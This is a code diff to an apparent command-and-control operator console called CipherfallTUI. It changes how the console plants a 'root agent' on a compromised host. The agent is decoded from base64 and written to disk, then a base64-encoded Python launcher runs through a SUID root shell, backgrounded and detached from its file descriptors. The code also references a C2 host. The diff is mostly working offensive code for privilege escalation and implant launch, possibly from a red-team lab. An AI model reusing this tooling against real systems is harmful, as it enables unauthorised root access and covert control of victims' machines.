@@ -1300,13 +1300,15 @@ class CipherfallTUI(App):
             served_path.write_text(agent_text, encoding="utf-8")
             host = _C2_HOST if _C2_HOST not in ("", "0.0.0.0") else "127.0.0.1"
             # nohup ... & inside SUID bash leaks the testuser agent's subprocess pipe
-            # write-end (bash saves FD1 at a high FD; that copy survives closerange in
-            # userspace but bypasses CLOEXEC on exec from a subshell).  Use a Python
-            # launcher that explicitly nullifies FDs 0-255 before execv-ing the agent,
-            # so the pipe write-end is closed and subprocess.run() returns immediately.
+            # write-end.  bash saves FD1 to a high-numbered FD (potentially > 255)
+            # before pipeline setup; that copy survives a narrow closerange and is
+            # inherited by the root agent.  Python subprocess.run(timeout=600) then
+            # expires, calls process.kill(), then calls process.communicate() with no
+            # timeout — which blocks indefinitely while the root agent holds the write-end.
+            # closerange(3, 4096) covers all shell-saved FDs so execv starts clean.
             _launch_src = (
                 f"import os\n"
-                f"os.closerange(3,256)\n"
+                f"os.closerange(3,4096)\n"
                 f"null=os.open('/dev/null',os.O_RDWR)\n"
                 f"os.dup2(null,0);os.dup2(null,1);os.dup2(null,2)\n"
                 f"os.close(null)\n"
@@ -1336,10 +1338,11 @@ class CipherfallTUI(App):
             # CF agent: inline the agent as base64, then use the same FD-clean launcher
             # as NTP to prevent the pipe write-end inherited from the parent agent's
             # subprocess.run(capture_output=True) from blocking communicate() indefinitely.
+            # closerange(3, 4096) covers bash-saved FDs above 255 (bash may dup1 to any fd).
             agent_b64 = base64.b64encode(agent_text.encode()).decode()
             _launch_src = (
                 f"import os\n"
-                f"os.closerange(3,256)\n"
+                f"os.closerange(3,4096)\n"
                 f"null=os.open('/dev/null',os.O_RDWR)\n"
                 f"os.dup2(null,0);os.dup2(null,1);os.dup2(null,2)\n"
                 f"os.close(null)\n"
@@ -1347,9 +1350,10 @@ class CipherfallTUI(App):
             )
             _launch_b64 = base64.b64encode(_launch_src.encode()).decode()
             spawn_cmd = (
-                f"printf '%s' '{agent_b64}' | base64 -d > {ra}; "
-                f"{shell_root} -c 'printf %s {_launch_b64}|base64 -d|python3 & echo ok'; "
-                f"echo '[rootagent:spawned]'"
+                f"printf '%s' '{agent_b64}' | base64 -d > {ra} && "
+                f"[ -s {ra} ] && "
+                f"{shell_root} -c 'printf %s {_launch_b64}|base64 -d|python3 & echo ok' && "
+                f"echo '[rootagent:spawned]' || echo '[rootagent:FAIL]'"
             )
         try:
             async with httpx.AsyncClient() as c:
